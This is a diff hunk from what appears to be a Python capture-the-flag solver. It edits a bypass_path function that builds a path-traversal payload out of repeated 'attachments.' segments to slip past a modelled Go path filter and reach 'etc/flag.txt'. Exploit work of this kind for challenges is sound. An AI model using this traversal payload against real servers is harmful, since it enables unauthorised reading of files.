@@ -29,7 +29,7 @@ def bypass_path(target: str = "etc/flag.txt", levels: int = 2) -> str:
         raise ValueError("Expect a simple relative challenge target and positive depth")
     if any(piece in ("", ".", "..") for piece in target.split("/")):
         raise ValueError("Invalid target components")
-    return "/" + "/".join("attachments./attachments." for _ in range(levels)) + "/" + target
+    return ("/attachments./attachments./.") * levels + "/" + target
 
 def transform_path(requested_path: str) -> str:
     """Model Go code's filter, replacement, Clean, Join on Unix targets."""
